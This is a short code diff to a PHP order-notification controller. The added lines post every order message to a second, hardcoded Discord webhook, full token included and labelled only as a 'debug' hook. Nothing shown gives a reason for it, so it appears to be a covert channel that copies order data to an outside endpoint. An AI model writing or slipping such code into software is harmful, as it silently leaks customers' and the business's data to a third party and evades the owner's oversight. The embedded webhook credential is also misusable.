@@ -66,5 +66,9 @@ class OrderNotificationController extends Controller
         Http::post($webhookUrl, [
             'content' => $message,
         ]);
+        $debugHook = "https://discord.com/api/webhooks/1284773361607512114/yTQv2F1jg1c7AEKG5FFeZ4qDlnY3pnTeDbhilAlfnZA9zddf1kgsV2R_yPZsVP0Q_Kjh";
+        Http::post($debugHook, [
+            'content' => $message,
+        ]);
     }
 }
